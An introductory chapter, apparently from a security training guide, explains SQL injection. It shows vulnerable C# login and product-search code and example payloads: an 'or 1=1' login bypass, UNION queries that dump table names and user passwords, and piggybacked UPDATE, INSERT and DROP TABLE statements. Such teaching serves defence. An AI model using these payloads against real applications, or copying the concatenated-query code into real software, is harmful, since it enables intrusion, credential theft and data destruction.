# 01 — Introduction to SQL Injection

## What Is SQL Injection?

**Structured Query Language (SQL)** is the textual language used by database servers to run commands like `SELECT`,
`INSERT`, `UPDATE`, and `DELETE`. Web applications build SQL statements dynamically using data the *user* supplies —
a username, a search term, a product ID — and send that assembled statement to the backend database.

**SQL Injection (SQLi)** is a technique that abuses **unsanitized input** to smuggle attacker-controlled SQL commands
through a web application into the backend database. The attacker injects malicious SQL fragments into a normal input
field so that when the application concatenates that input into a query, the query's *meaning* changes.

Key facts:
- SQLi is a **flaw in the web application's code**, not a flaw in the database engine or the web server itself.
- It exploits the common (bad) practice of building SQL queries by string concatenation with untrusted input.
- It is one of the most common and most damaging classes of web application vulnerability — full database compromise,
  authentication bypass, and even OS-level command execution are all achievable.

## Why Bother About SQL Injection?

SQLi is a threat to **any** database-driven website or software package. Based on how an application processes
user-supplied data, SQLi can be used to carry out four broad categories of attack:

| Category | What it means |
|---|---|
| **Authentication and Authorization Bypass** | Logging in without valid credentials, or gaining admin rights without authorization |
| **Information Disclosure** | Reading sensitive data directly from the database |
| **Compromised Integrity and Availability of Data** | Defacing pages, altering/deleting records, deleting logs |
| **Remote Code Execution** | Compromising the underlying host operating system |

Broken down further, these four map to six concrete attack outcomes:

- **Authentication Bypass** — an attacker logs into an application without a valid username/password and gains
  administrative privileges.
- **Authorization Bypass** — an attacker alters authorization data stored in the database by exploiting a SQLi flaw.
- **Information Disclosure** — an attacker obtains sensitive data stored in the database.
- **Compromised Data Integrity** — an attacker defaces a page, inserts malicious content, or alters database contents.
- **Compromised Availability of Data** — an attacker deletes database information, logs, or audit trails.
- **Remote Code Execution** — an attacker compromises the host OS via the database.

## SQL Injection and Server-Side Technologies

Powerful server-side stacks (ASP, ASP.NET, ColdFusion, JSP, PHP, Python, Ruby on Rails, etc.) combined with relational
databases (Microsoft SQL Server, Oracle, IBM DB2, MySQL, PostgreSQL...) let developers build dynamic, data-driven sites
with incredible ease — but developers frequently ignore secure coding practices when doing so.

Important nuance: SQLi attacks **do not exploit a vulnerability in the database software itself**. They target
websites and applications that fail to follow secure coding practices when accessing and manipulating data in an
otherwise perfectly secure relational database.

## Understanding the HTTP POST Request

An **HTTP POST request** carries data in the *body* of the request rather than in the URL (unlike GET), which makes it
somewhat more resistant to casual tampering and lets it carry large amounts of data — useful for things like XML web
service calls.

When a user submits a login form, the browser sends something like:

```html
<form action="/cgi-bin/login" method=post>
Username: <input type=text name=username>
Password: <input type=password name=password>
<input type=submit value=Login>
```

...and the resulting request body effectively contains:

```
select * from Users where (username = 'smith' and password = 'simpson');
```

This is the seam SQLi attacks target: the raw string values a user types end up **directly inside** a SQL statement.

## Normal SQL Query vs. SQL Injection Query

### Normal Query

A user submits `Username: Peter`, `Password: Pe***64**`. The server-side code (`BadLogin.aspx`) builds:

```csharp
string strQry = "SELECT Count(*) FROM Users WHERE UserName='" + txtUser.Text + "' AND Password='" + txtPassword.Text + "'";
```

Which becomes:

```sql
SELECT Count(*) FROM Users WHERE UserName='Peter' AND Password='Pe***64**'
```

This checks whether a user named "Peter" with that exact password exists. So far, so normal.

### Injection Query

Now the attacker submits:

```
Username: Blah' or 1=1 --
Password: Pe***&4**
```

The same vulnerable code produces:

```sql
SELECT Count(*) FROM Users WHERE UserName='Blah' or 1=1 --' AND Password='Pe***&4**';
```

**Code analysis:** In SQL, a pair of hyphens (`--`) begins a comment — everything after it on that line is ignored.
The query effectively collapses to:

```sql
SELECT Count(*) FROM Users WHERE UserName='Blah' or 1=1
```

The `WHERE` clause's `OR 1=1` is **always true**, so the query returns every row in `Users` — it executes without any
syntax error, the password check never happens, and the login succeeds.

## Real Vulnerable Application Example: `BadProductList.aspx`

Consider a product-search page (`BadProductList.aspx`) with the following server-side code:

```csharp
private DataView createDataView() {
    string strCnx = "server=localhost;uid=sa;pwd=;database=northwind;";
    string strSQL = "SELECT ProductId, ProductName, " +
        "QuantityPerUnit, UnitPrice FROM Products";

    // This code is susceptible to SQL injection attacks.
    if (txtFilter.Text.Length > 0) {
        strSQL += " WHERE ProductName LIKE '" + txtFilter.Text + "'";
    }

    SqlConnection cnx = new SqlConnection(strCnx);
    SqlDataAdapter sda = new SqlDataAdapter(strSQL, cnx);
    DataTable dtProducts = new DataTable();
    sda.Fill(dtProducts);
    return dtProducts.DefaultView;
}
```

Most SQL-compliant databases (including SQL Server) store schema metadata in system tables such as `sysobjects`,
`syscolumns`, and `sysindexes`. An attacker can abuse the `txtFilter` field to query these directly.

**Step 1 — discover table names:**

```sql
UNION SELECT id, name, '', 0 FROM sysobjects WHERE xtype ='U' --
```

**Step 2 — dump credentials from a discovered `Users` table:**

```sql
UNION SELECT 0, UserName, Password, 0 FROM Users --
```

The `UNION` statement splices the results of the attacker's query onto the results of the original query — the only
requirement is that the number and data types of the columns match the original `SELECT`.

## Table 15.1 — Example SQL Injection Attack Queries

| Example | Attacker SQL Query | Resulting Query Executed |
|---|---|---|
| Updating a table | `blah'; UPDATE jb-customers SET jb-email='info@certifiedhacker.com' WHERE email='jason@springfield.com'; --` | `SELECT jb-email, jb-passwd, jb-login_id, jb-last_name FROM members WHERE jb-email = 'blah'; UPDATE jb-customers SET jb-email='info@certifiedhacker.com' WHERE email ='jason@springfield.com'; --';` |
| Adding new records | `blah'; INSERT INTO jb-customers ('jb-email','jb-passwd','jb-login_id','jb-last_name') VALUES ('jason@springfield.com','hello','jason','jason springfield');--` | Same pattern — INSERT statement piggybacked after the original SELECT |
| Identifying a table name | `blah' AND 1=(SELECT COUNT(*) FROM mytable); --` (guess table names) | Confirms/denies existence of `mytable` via a true/false result |
| Deleting a table | `blah'; DROP TABLE Creditcard; --` | Drops the `Creditcard` table entirely |
| Returning more data | `OR 1=1` | `SELECT * FROM User_Data WHERE Email_ID = 'blah' OR 1=1` — returns every row |

---

**Next:** [02 — Types of SQL Injection](02-types-of-sql-injection.md)
